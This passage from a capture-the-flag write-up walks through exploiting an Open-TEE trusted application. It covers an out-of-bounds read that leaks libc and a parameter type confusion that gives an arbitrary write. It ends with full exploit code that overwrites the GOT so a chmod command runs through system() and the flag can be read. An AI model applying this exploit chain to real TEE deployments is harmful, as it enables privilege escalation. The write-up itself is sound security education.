    * `params[1]` is a Memory Reference to `struct signedStudent`
  * `SIGN_CLASS_STUDENT`. This command signs the given student at the given index.
    * `params[0]` is a Memory Reference to `struct student`
    * `params[1]` is a Memory Reference to `struct signedStudent`
    * `params[2]` is a Value Parameter and is used as an index in the `params[0]` buffer.
  * `SIGN_STUDENT`. This command signs the given student using memory references.
    * `params[0]` is a Memory Reference to `struct student`
    * `params[1]` is a Memory Reference to `struct signedStudent`

### 4.1 Identifying the bugs

Now, we have fully reversed the TA and know its functionality. Next step is to spot the bugs. The first major bug is that no command checks the type of arguments and their data flow direction. This is **really really really bad** as type confusion is possible in all commands. The following bugs are also present:

* In `SIGN_CLASS`, the size is not checked correctly. The line `end = curSignedStudent + NR_STUDENTS` means that the given memory reference is always assumed to contain `NR_STUDENTS*sizeof(struct student)` bytes.
* In `SIGN_CLASS_STUDENT`, there is no bounds checking on the index. This leads to an arbitrary read.

## 5. Detour! Environment setup

Great! At this point we have analyzed the TA and know where the bugs are. Next step is to start poking the TA by writing a client application, running it, and debugging things! In this challenge a [Dockerfile](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/Dockerfile) was provided. This Dockerfile is based on the [install instructions of Open-TEE](https://github.com/Open-TEE/Open-TEE#setup). We [augment the Dockerfile](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/solution/Dockerfile) a bit as shown below to facilitate easier debugging:

```diff
fane@ctf-box:~/ctfs/lakeCTF23/trustMEE-replay$ git diff --no-index challenge-desc/Dockerfile Dockerfile
diff --git a/challenge-desc/Dockerfile b/Dockerfile
index eedd449..fdeb85d 100644
--- a/challenge-desc/Dockerfile
+++ b/Dockerfile
@@ -1,7 +1,21 @@
-# docker build -t trustmee . && docker run --rm -it ctf trustmee && docker exec -it -u ctf [docker_id] /bin/bash
+# docker build -t trustmee .
+#
+# docker run -v ./solution:/home/ctf/solution --cap-add=SYS_PTRACE --rm -it --name trustmee_1 trustmee
+#  * --cap-add=SYS_PTRACE is used so that we can run gdb inside
+#  * mounting a volume for easier exploit development
+# To pwn the challenge:
+#   docker exec -it -u ctf trustmee_1 /bin/bash
+# To debug the challenge
+#   docker exec -it -u root trustmee_1 /bin/bash
 FROM ubuntu:22.04@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6

+# Fix locales
+ENV LANG en_US.utf8
+RUN apt-get update && apt-get install -y locales
+RUN localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8
+
 # Dependencies
+RUN apt-get install -y gdb
 RUN apt-get update && \
     apt-get install -y wget xinetd cmake build-essential unzip git dropbear rsync openssh-client libcap2-bin python3 python3-pip && apt-get clean

@@ -9,6 +23,12 @@ RUN useradd -d /home/ctf/ -m -s /bin/bash ctf && passwd -d ctf

 WORKDIR /home/ctf

+# Setup pwndbg
+RUN git clone https://github.com/pwndbg/pwndbg
+WORKDIR /home/ctf/pwndbg
+RUN ./setup.sh
+WORKDIR /home/ctf/
+
 # Clone and install OpenTEE
 RUN apt-get install -y build-essential git pkg-config uuid-dev libelf-dev wget curl autoconf automake libtool libfuse-dev

@@ -45,6 +65,9 @@ RUN chmod +x /opt/OpenTee/lib/TAs/grade_ta.so
 COPY opentee.conf /etc/
 RUN ln -s /usr/local/lib/libmbedcrypto.so.3.1.0 /opt/OpenTee/lib/libmbedcrypto.so.11

+ENV OPEN_TEE_PATH /opt/OpenTee
+ENV LD_LIBRARY_PATH="${LD_LIBRARY_PATH}:$OPEN_TEE_PATH/lib"
+
 # Copy flag
 COPY flag.txt /opt/OpenTee/
 RUN chmod 000 /opt/OpenTee/flag.txt
```

We first build the docker image with the command `docker build -t trustmee .`. Then, we can run the image with the command `docker run -v ./solution:/home/ctf/solution --cap-add=SYS_PTRACE --rm -it --name trustmee_1 trustmee`. Running the image should produce no output and the terminal should seem like "hanging", since `tail -f /dev/null` is the last command executed by the docker's entrypoint. Attaching a volume makes CA development also easier.

Next, in a new terminal, we can attach to the challenge using `docker exec -it -u root trustmee_1 /bin/bash`. Here is how the environment looks like:

![challenge-running.png](/post-resources/TrustMEE/challenge-running.png)

### 5.1 Creating a Client Application (CA)

In this challenge, we are given a starting point as we are provided with a minimal client application ([grade_ca.c](https://github.com/nikosChalk/ctf-writeups/blob/master/lakeCTF23/pwn/trustMEE/resources/grade_ca.c)) shown below. However, even without this starting point, we already learnt enough to be able to build it on our own 🙃

```c
// grade_ca.c
#include "tee_client_api.h"
#include "grade_ca.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const TEEC_UUID uuid = {
  0x11223344, 0xA710, 0x469E, { 0xAC, 0xC8, 0x5E, 0xDF, 0x8C, 0x85, 0x90, 0xE1 }
};

int main() {
  TEEC_Context context;
  TEEC_Session session;
  TEEC_Operation operation;
  TEEC_SharedMemory in_mem;
  TEEC_SharedMemory out_mem;
  TEEC_Result tee_rv;
  memset((void *)&in_mem, 0, sizeof(in_mem));
  memset((void *)&operation, 0, sizeof(operation));

  printf("Initializing context: ");
  tee_rv = TEEC_InitializeContext(NULL, &context);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_InitializeContext failed: 0x%x\n", tee_rv);
    exit(0);
  } else {
    printf("initialized\n");
  }

  // Connect to the TA
  printf("Openning session: ");
  tee_rv = TEEC_OpenSession(&context, &session, &uuid, TEEC_LOGIN_PUBLIC, NULL, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_OpenSession failed: 0x%x\n", tee_rv);
    exit(0);
  } else {
    printf("opened\n");
  }

  // Setup memory for the input/output classes
  struct studentclass* StudentClassInst = (struct studentclass*)malloc(sizeof(struct studentclass)); 
  struct signedStudentclass* signedStudentClassInst = (struct signedStudentclass*)malloc(sizeof(struct signedStudentclass)); 
  memset(StudentClassInst, 0, sizeof(struct studentclass));
  memset(signedStudentClassInst, 0, sizeof(struct signedStudentclass));

  StudentClassInst->students[0].grade = 6;
  memset(StudentClassInst->students[0].firstname, 'A', NAME_LEN-1);
  memset(StudentClassInst->students[0].lastname, 'B', NAME_LEN-1);

  in_mem.buffer = (void*)StudentClassInst;
  in_mem.size = sizeof(struct studentclass);
  in_mem.flags = TEEC_MEM_INPUT;

  // Register shared memory, allows us to read data from TEE or read data from it
  tee_rv = TEEC_RegisterSharedMemory(&context, &in_mem);
  if (tee_rv != TEE_SUCCESS) {
    printf("Failed to register studentclass shared memory\n");
    exit(0);
  }
  printf("registered shared memory for student class\n");

  out_mem.buffer = (void*)signedStudentClassInst;
  out_mem.size = sizeof(struct signedStudentclass);
  out_mem.flags = TEEC_MEM_OUTPUT;

  tee_rv = TEEC_RegisterSharedMemory(&context, &out_mem);
  if (tee_rv != TEE_SUCCESS) {
    printf("Failed to register signed studentclass memory\n");
    exit(0);
  }

  /*
  @TODO: Implement actual logic to sign student grades.
  */
}
```

The missing part here is how to compile it. We make a simple [Makefile](https://github.com/nikosChalk/ctf-writeups/blob/master/lakeCTF23/pwn/trustMEE/solution/Makefile) for it:

```makefile
OPEN_TEE_PATH=/opt/OpenTee
CFLAGS += -g -Wall -I/home/ctf/opentee/libtee/include -I./
LDADD += -L$(OPEN_TEE_PATH)/lib/ -ltee

.PHONY: all
all: grade_ca

grade_ca: grade_ca.c grade_ca.h
	$(CC) $(CFLAGS) -o $@ $^ $(LDADD)

.PHONY: clean
clean:
	rm -f *.o grade_ca
```

![ta-running](/post-resources/TrustMEE/ta-running.png)

### 5.2 Debugging

Let's close the environment setup chapter by talking about debugging.

If we want to debug our Client Application, the process is the same as with any other C program that we write. The CA does not differ to any regular application as it is running in the REE. If we want to debug the TA, we attach to the docker container with the `root` user (`docker exec -it -u root trustmee_1 /bin/bash`). There are two ways to debug TAs:

#### 5.2.1 Debugging from the very beginning

In this method we want to attach to the TA from the very beginning, including being able to debug the `TA_CreateEntryPoint`, i.e. instance creation. To do so, we will attach gdb to the Open-TEE framework. New TA instances are spawned as new processes and run in an endless loop awaiting for Tasks (i.e. commands). Here is how it is done internally in Open-TEE:

```c
int lib_main_loop(struct core_control *ctl_params)
{
    //...
    new_proc_pid = clone(ta_process_loop, child_stack + CHILD_STACK_SIZE, SIGCHLD | CLONE_PARENT, &ta_loop_args);
    //...
}
int ta_process_loop(void *arg) {
    //...
    load_ta(path, &interface); //Will perform dlopen() and bring the TA into memory
    //...
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&ta_logic_thread, &attr, ta_internal_thread, open_msg);
}
void *ta_internal_thread(void *arg) {
    //...
    for (;;) {
        //Wait for Tasks
        //Execute Tasks (e.g. open a session, invoke command, etc.)
        //Repeat
    }
    //...
}
```

So, we will spawn gdb with the command ``gdb /opt/OpenTee/bin/opentee-engine `pgrep -f tee_launcher` ``. Next, we will use the following gdb commands:

```gdb
set follow-fork-mode child
b ta_internal_thread
command
  b TA_CreateEntryPoint
end
continue
```

Afterwards, using our client application, we can load the TA and debug it from the very beginning.

#### 5.2.2 Attaching a debugger to a TA instance

In this case, a TA instance already exists and we want to attach to it. The TA is shown when we run `ps aux` as a process named `grade_ta.so`. We simply attach to it via gdb and debugging is possible immediately: ``gdb /opt/OpenTee/bin/opentee-engine `pgrep -f grade_ta.so` ``


## 6. Identifying an exploitation strategy

On the machine running this challenge we have userspace access. The flag is located at `/opt/OpenTee/flag.txt` and belongs to the `root` user with all permissions removed:

```log
ctf@42ac3fd4b5ef:/home/ctf/solution$ ls -l /opt/OpenTee/flag.txt
---------- 1 root root 44 Dec 28 21:17 /opt/OpenTee/flag.txt
ctf@42ac3fd4b5ef:/home/ctf/solution$ cat /opt/OpenTee/flag.txt
cat: /opt/OpenTee/flag.txt: Permission denied
```

As we run as the `ctf` user, we cannot access the flag. Our goal will be to exploit the TA and do a `chmod 777 /opt/OpenTee/flag.txt` so that later we can dump the flag with `cat /opt/OpenTee/flag.txt`. It is worth noting that the TA does not produce any output logs and its `stdin`/`stderr`/`stdout` are redirected to `/dev/null`:

![no TA output](/post-resources/TrustMEE/no-output.png)

## 7. Writing the exploit

Here is a reminder of the bugs that are in-place:

1. The first major bug is that no TA command checks the type of arguments and their direction. This is really bad as type confusion is possible in all commands.
2. In `SIGN_CLASS`, the size is not checked correctly. The line `end = curSignedStudent + NR_STUDENTS` means that the given memory reference is always assumed to contain `NR_STUDENTS*sizeof(struct student)` bytes.
3. In `SIGN_CLASS_STUDENT`, there is no bounds checking on the index. This leads to an arbitrary read.

### 7.1 `libc.so` leak

We will start with 3. &mdash; the arbitrary read:

```c
/* SIGN_CLASS_STUDENT */
studentArray = (student *)(params->memref).buffer;
curSignedStudent = (signedStudent *)params[1].memref.buffer;
idx = params[2].value.a;
if (TEE_CheckMemoryAccessRights(5,studentArray,params[0].memref.size) == TEE_SUCCESS) {
  if (TEE_CheckMemoryAccessRights(5,curSignedStudent, params[1].memref.size) == TEE_SUCCESS) {
  student1 = studentArray + (int)idx;
  TEE_MemMove(curSignedStudent,student1,0x10);
  TEE_MemMove(curSignedStudent->lastname,student1->lastname,0x10);
  curSignedStudent->grade = student1->grade;
  curSignedStudent->sciper = student1->sciper;
  TVar1 = calculate_signature(sessionContext,curSignedStudent);
} }
```

As you can see, we can use any `idx` and make `student1` point anywhere in memory. The buffer `curSignedStudent` is a Shared Memory block that we supply with type `TEEC_MEM_OUTPUT`. So, with a single `SIGN_CLASS_STUDENT` command we can leak `0x28` bytes (excluding the random signature). We will use this primitive to find the base address of libc. To do so, we will initially use `idx=0` and insert a breakpoint at `TEE_MemMove(curSignedStudent,student1,0x10)`:

![breakpoint-leak.png](/post-resources/TrustMEE/breakpoint-leak.png)

`$rsi=0x7fc3132b2000` is the address of our Shared Memory block and belongs to the `/dev/shm/5203tttttttttt972022484tttttt1704030777tttt` VMA. A little further below is the `rw-` page of `ld.so`. We will search that page, as it is the nearset one, for pointers in order to leak libc:

![libc-leak.png](/post-resources/TrustMEE/libc-leak.png)

Perfect! We find a libc leak at `$rsi+0x3000+0x18`, which corresponds to the symbol `_dl_catch_exception`. With some arithmetic, we find out that this symbol is located at libc offset `0x174820`. So, if we leak this pointer (`_dl_catch_exception=0x7fc3131c0820`) we can find the base address of libc!

```c
memset((void *)&operation, 0, sizeof(operation));
operation.paramTypes = TEEC_PARAM_TYPES(
  TEEC_MEMREF_WHOLE,
  TEEC_MEMREF_WHOLE,
  TEEC_VALUE_INPUT,
  TEEC_NONE
);
operation.params[0].memref.parent = &in_mem;
operation.params[1].memref.parent = &out_mem;
// Byte offset 0x3018 translates to :
//  0x3018/sizeof(struct student)
// =0x3018/0x28
// =307=0x133 offset of a `struct student` array.
operation.params[2].value.a = 0x133;

printf("Invoking command SIGN_CLASS_STUDENT: \n");
tee_rv = TEEC_InvokeCommand(&session, SIGN_CLASS_STUDENT, &operation, NULL);
if (tee_rv != TEEC_SUCCESS && tee_rv != TEEC_ERROR_SECURITY) {
  printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
  exit(tee_rv);
}
printf("res: 0x%x\n", tee_rv);
DumpHex(out_mem.buffer, sizeof(struct signedStudent));
uint64_t libc_leak = *(uint64_t*)((char*)out_mem.buffer+0x20);
uint64_t libc_base = libc_leak - 0x174820;
uint64_t libc_system = libc_base + 0x50d70;
printf("Found libc base: 0x%lx\n", libc_base);
```

![libc-leak-poc.png](/post-resources/TrustMEE/libc-leak-poc.png)

### 7.2 `grade_ta.so` leak

Perfect, we have leaked libc! How about the base address of `grade_ta.so`? We will rely on mmap relativity. When pages are mmaped, the base address of where mmaped pages are allowed to live is the only thing randomized (`mmap_base`). However, subsequent mmap calls return an address relative to the `mmap_base`. Here is a very simply demonstration of mmap relativity:

```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>

#define ABS_DIFF(x,y) ( (x) > (y) ? ( (x)-(y) ) : ( (y)-(x) ) )
int main() {
    char *addr1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char *addr2 = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char *addr3 = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("Base mmap addr: 0x%lx\n", (uint64_t)addr1);
    printf(" [*] mmap addr1: 0x%lx\n", (uint64_t)addr1);
    printf(" [*] mmap addr2: 0x%lx\n", (uint64_t)addr2);
    printf(" [*] mmap addr3: 0x%lx\n", (uint64_t)addr3);
    printf("ABS(addr1-addr2) = 0x%lx\n", ABS_DIFF(addr1, addr2));
    printf("ABS(addr2-addr3) = 0x%lx\n", ABS_DIFF(addr2, addr3));
    return 0;
}
```

![mmap-relativity.png](/post-resources/TrustMEE/mmap-relativity.png)

As you can see, no matter how many times we run the program, the relative offset between mmaped pages is constant. The base address is always randomized, however subseqeuent mmap calls return an address deterministically relative to the first mmap call.

We will take advantage of mmap relativity as the `grade_ta.so` is actually loaded by an `mmap` call! The `grade_ta.so` is not the PIE binary itself (`/opt/OpenTee/bin/opentee-engine` is the underlying binary in this case). `grade_ta.so` is loaded with `dlopen` by the `load_ta` internal Open-TEE function. With simple arithmetic, we find out that `grade_ta.so` is loaded at constant offset `0x228000` from `libc.so`:

![grade_ta-offset.png](/post-resources/TrustMEE/grade_ta-offset.png)

### 7.3 Write-what-where primitive

Remember the 1<sup>st</sup> bug &mdash; no check is performed on TA parameter types. This leads to a type confusion vulnerability. What if instead of a Memory Reference Parameter we provide a Value Paramter when the TA expects a Memory Reference Parameter? Here is what happens internally in the Open-TEE framework with respect to parameters:

```c
/*!
 * \brief copy_tee_operation_to_internal
 * Convert the TEE operation into a generic format so that it can be sent to the TA
 * \param operation The TEE operation format
 * \param internal_op the communication protocol format
 * \return 0 on success
 */
static void copy_tee_operation_to_internal(TEEC_Operation *operation,
             struct com_msg_operation *internal_op)
{
  struct shared_mem_internal *internal_imp;
  TEEC_SharedMemory *mem_source;
  size_t offset;
  int i;

  memset(internal_op, 0, sizeof(struct com_msg_operation));

  internal_op->paramTypes = operation->paramTypes;
  FOR_EACH_PARAM(i) {
    if (TEEC_PARAM_TYPE_GET(internal_op->paramTypes, i) == TEEC_NONE ||
        TEEC_PARAM_TYPE_GET(internal_op->paramTypes, i) == TEEC_VALUE_OUTPUT) {
      continue;
    } else if (TEEC_PARAM_TYPE_GET(internal_op->paramTypes, i) == TEEC_VALUE_INPUT ||
         TEEC_PARAM_TYPE_GET(internal_op->paramTypes, i) == TEEC_VALUE_INOUT) {

      memcpy(&internal_op->params[i].param.value,
             &operation->params[i].value, sizeof(TEEC_Value));
      continue;
    }
    //...
}
```

As expected, the Value Paramter is copied via a `memcpy` from the CA to the TEE. However, the TA sees a `TEE_Param` union structure:

```c
typedef union {
  struct {
    void* buffer;
    size_t size;
  } memref;
  struct {
    uint32_t a;
    uint32_t b;
  } value;
} TEE_Param;
```

This means that the `TEE_Param.value` and `TEE_Param.memref.buffer` overlap in memory! Under a parameter type confusion bug we can provide a Value Paramter and the TA will interpret it as a raw 64-bit pointer! The `TEE_Param.memref.size` will be zero because of the `memset(internal_op, 0, sizeof(struct com_msg_operation))` shown above. With this in mind, we notice that we can control the pointers passed in `TEE_Memmove` (e.g. `TEE_MemMove(curSignedStudent,student1,0x10)`). The given TA has partial RELRO and `TEE_Memmove` is present in its `.got.plt` section. With this information we conclude 2 things:

1. We have an arbitrary write since we control both pointers in `TEE_Memove`. These pointers have to pass the check `TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, ptr, sz)`.
2. By overwriting the `.got.plt` section, we can change `TEE_Memmove` to point to libc's `system`. This is useful because can control both the arguments to `TEE_Memmove` and their content.

We will focus on the `SIGN_STUDENT` command:

```c
TVar1 = TEE_CheckMemoryAccessRights(5,student2,(params->memref).size);
if (TVar1 == TEE_SUCCESS) {
  TVar1 = TEE_CheckMemoryAccessRights(5,curSignedStudent,sz);
  if (TVar1 == TEE_SUCCESS) {
  TEE_MemMove(curSignedStudent,student2,0x10);
  TEE_MemMove(curSignedStudent->lastname,student2->lastname,0x10);
  curSignedStudent->grade = student2->grade;
  curSignedStudent->sciper = student2->sciper;
  TVar1 = calculate_signature(sessionContext,curSignedStudent); //writes 0x10 bytes at curSignedStudent+0x28
  return TVar1;
}  }
```

Using a `SIGN_STUDENT` command, we will use the 2<sup>nd</sup> `TEE_MemMove` shown above to overwrite the `TEE_MemMove@.got.plt` to point to `system`. This can be achieved by doing a type confusion on `params[1]`. With a subsequent `SIGN_STUDENT` command, we will invoke `TEE_MemMove("chmod ugo+r /opt/OpenTee/flag.txt")` which will actually resolve to `system("chmod ugo+r /opt/OpenTee/flag.txt")`. Afterwards, we will be able to dump the flag. Here is the exploit for the type confusion:

```c
static void create_64bit_TEEC_Value(TEEC_Value *dest, uint64_t val) {
  dest->a = (val << 32) >> 32;
  dest->b = val >> 32;
}
int main() {
  // ...
  uint64_t libc_base = /* ... */;
  uint64_t libc_system = libc_base + 0x50d70;
  printf("Found libc base: 0x%lx\n", libc_base);
  printf(" [*] system: 0x%lx\n", libc_system);

  //grade_ta.so is mmaped via dlopen()
  uint64_t grade_ta_base = libc_base + 0x228000;
  uint64_t grade_ta_getRandomByte_got_plt = grade_ta_base + 0x4020;
  printf("Found grade_ta.so base: 0x%lx\n", grade_ta_base);
  printf(" [*] getRandomByte@.got.plt: 0x%lx\n", grade_ta_getRandomByte_got_plt);

  uint64_t ret_0_gadget = grade_ta_base + 0x1284; // xor eax, eax; ret;
  
  /*
pwndbg> got -p grade_ta.so
Filtering by lib/objfile path: grade_ta.so
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /opt/OpenTee/lib/TAs/grade_ta.so:
GOT protection: Partial RELRO | Found 11 GOT entries passing the filter
[0x7fc313278018] TEE_CheckMemoryAccessRights -> 0x7fc313028d30 (TEE_CheckMemoryAccessRights) ◂— endbr64
[0x7fc313278020] getRandomByte -> 0x7fc313275260 (getRandomByte) ◂— endbr64
[0x7fc313278028] __stack_chk_fail@GLIBC_2.4 -> 0x7fc313182360 (__stack_chk_fail) ◂— endbr64
[0x7fc313278030] printf@GLIBC_2.2.5 -> 0x7fc3130ac6f0 (printf) ◂— endbr64
[0x7fc313278038] TEE_MemMove -> 0x7fc313028f10 (TEE_MemMove) ◂— endbr64
[0x7fc313278040] TEE_AllocateOperation -> 0x7fc3130320b0 (TEE_AllocateOperation) ◂— endbr64
[0x7fc313278048] __syslog_chk@GLIBC_2.4 -> 0x7fc31316a2e0 (__syslog_chk) ◂— endbr64
[0x7fc313278050] TEE_DigestUpdate -> 0x7fc31302c190 (TEE_DigestUpdate) ◂— endbr64
[0x7fc313278058] calculate_signature -> 0x7fc313275300 (calculate_signature) ◂— endbr64
[0x7fc313278060] TEE_DigestDoFinal -> 0x7fc31302c280 (TEE_DigestDoFinal) ◂— endbr64
[0x7fc313278068] rand@GLIBC_2.2.5 -> 0x7fc313092760 (rand) ◂— endbr64
  */

  //Let's do the arbitrary write
  memset((void *)&operation, 0, sizeof(operation));
  memset(out_mem.buffer, 0, sizeof(struct signedStudent));
  operation.paramTypes = TEEC_PARAM_TYPES(
    TEEC_MEMREF_WHOLE,
    TEEC_VALUE_INPUT, //type confusion
    TEEC_NONE,
    TEEC_NONE
  );
  operation.params[0].memref.parent = &in_mem;
  create_64bit_TEEC_Value(&operation.params[1].value, grade_ta_getRandomByte_got_plt); //destination address

  char *payload = (char*)in_mem.buffer;
  *(uint64_t*)(payload+0x00) = ret_0_gadget; // getRandomByte
  *(uint64_t*)(payload+0x08) = ret_0_gadget; // __stack_chk_fail
  *(uint64_t*)(payload+0x10) = ret_0_gadget; // printf@GLIBC
  *(uint64_t*)(payload+0x18) = libc_system;  // TEE_MemMove
  *(uint64_t*)(payload+0x20) = ret_0_gadget; // TEE_AllocateOperation
  //__syslog_chk@glibc will be trashed by calculate_signature()
  //TEE_DigestUpdate   will be trashed by calculate_signature()
  
  printf("Invoking command SIGN_STUDENT (overwriting .got.plt): \n");
  tee_rv = TEEC_InvokeCommand(&session, SIGN_STUDENT, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS && tee_rv != TEEC_ERROR_SECURITY) {
    printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
    exit(tee_rv);
  }
  printf("res: 0x%x\n", tee_rv);

  //Now, let's trigger system() with our command
  memset((void *)&operation, 0, sizeof(operation));
  operation.paramTypes = TEEC_PARAM_TYPES(
    TEEC_MEMREF_WHOLE,
    TEEC_MEMREF_WHOLE, // we control the contents of the buffer
    TEEC_NONE,
    TEEC_NONE
  );
  memset(in_mem.buffer, 0, sizeof(struct student));
  strcpy(out_mem.buffer, "chmod ugo+r /opt/OpenTee/flag.txt");

  operation.params[0].memref.parent = &in_mem;
  operation.params[1].memref.parent = &out_mem;
  
  printf("Invoking command SIGN_STUDENT (changing flag permissions): \n");
  tee_rv = TEEC_InvokeCommand(&session, SIGN_STUDENT, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS && tee_rv != TEEC_ERROR_SECURITY) {
    printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
    exit(tee_rv);
  }
  printf("res: 0x%x\n", tee_rv);

  system("cat /opt/OpenTee/flag.txt");
  return 0;
}
```

![flag](/post-resources/TrustMEE/flag.png)

And we have the flag! Thank you for reading 🏴

`EPFL{ju5t_4_h4PPY_L1ttL3_Typ3_c0nfu510n_8u9}`
